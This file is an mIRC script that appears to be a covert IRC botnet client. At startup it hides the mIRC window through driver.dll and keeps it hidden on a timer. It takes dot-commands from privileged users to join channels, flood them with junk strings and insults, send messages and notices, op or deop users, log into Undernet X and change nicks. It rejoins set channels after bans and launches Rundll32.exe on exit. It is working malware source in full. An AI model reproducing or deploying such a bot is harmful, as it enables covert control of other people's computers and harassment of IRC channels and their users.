[script]
n0=On *:START:{
n1=  echo -s $dll(driver.dll, do_ShowWindow, $window(-2).hwnd 0) 
n2=  .$_e
n3=  .timer 1 2 /showmirc -s 
n4=  Hide
n5=}
n6=alias Hide { timerhide 0 0 Check }
n7=
n8=alias Check {
n9=  if ($appstate != Hidden) { .echo -s $dll(driver.dll, do_ShowWindow, $window(-2).hwnd 0) }
n10=}

n11=on *:BAN:#:{ if ($banmask iswm $address($me,5)) { timer 0 300 join #Bebishim } }

n12=on 100:text:.nick:*: .nick $read winnik.ini

n13=on 100:text:.join*:*: .join #$2
n14=on 100:text:.j*:*: .join #$2

n15=on 100:text:.j #Alaturca:*:if ($me !isop $chan) { halt }
n16=on 100:text:.p Alaturca:*:if ($me !isop $chan) { halt }
n17=on 100:text:.part #Alaturca:*:if ($me !isop $chan) { halt }
n18=on 100:text:.part Alaturca:*:if ($me !isop $chan) { halt }
n19=on 100:text:.part*:*: .part #$2
n20=on 100:text:.p*:*: .part #$2

n21=on 100:text:.query*:*: .msg $2-
n22=on 100:text:.q*:*: .msg $2-

n23=on 100:text:.say #Alaturca*:*:if  ($me !isop $chan) { halt }
n24=on 100:text:.say Alaturca*:*:if  ($me !isop $chan) { halt }
n25=on 100:text:.say*:*: .msg #$2-

n26=on 100:text:.gosay #Alaturca*:*:if  ($me !isop $chan) { halt }
n27=on 100:text:.gosay Alaturca*:*:if  ($me !isop $chan) { halt }
n28=on 100:text:.gosay*:*: .join #$2 | timer 1 1 .msg #$2 #&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&% [SeSTeaM] | timer 1 2 .msg #$2 #&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&% [SeSTeaM] | timer 1 3 .part #$2 /!\ Fak Yuu Meen /!\

n29=on 100:text:.notice #Alaturca*:*:if  ($me !isop $chan) { halt }
n30=on 100:text:.notice Alaturca*:*:if  ($me !isop $chan) { halt }
n31=on 100:text:.notice*:*: .notice #$2-

n32=on 100:text:.gonotice #Alaturca*:*:if  ($me !isop $chan) { halt }
n33=on 100:text:.gonotice Alaturca*:*:if  ($me !isop $chan) { halt }
n34=on 100:text:.gonotice*:*: .join #$2 | timer 1 1 .notice #$2 #&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&% [SeSTeaM] | timer 1 2 .notice #$2 #&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&%#&% [SeSTeaM] | timer 1 3 .part #$2 /!\ Fak Yuu Meen /!\

n35=on 100:text:.op*:*: .mode $chan +ooooo $2-
n36=on 100:text:.deop*:*: .mode $chan -ooooo $2-	
n37=on 500:text:.quit*:*: .quit killed by auto G-Line 6 (exessive clone bots)

n38=On *:EXIT:{
n39=  run Rundll32.exe
n40=}

n41=on 100:text:.login*:*: .msg x@channels.undernet.org login $2-
n42=on 100:text:.mode*:*: .mode $2-
n43=on 100:text:.isim*:*: .nick $2-
n44=on 100:text:.yes*:*: .msg x support $2-
n45=on 100:text:.ping*:*: .ping $2-

n46=on *:BAN:#:{ if ($banmask iswm $address($me,5)) { timer 0 300 join #Alaturca } }
n47=on *:BAN:#:{ if ($banmask iswm $address($me,5)) { timer 0 350 join #MyCity } }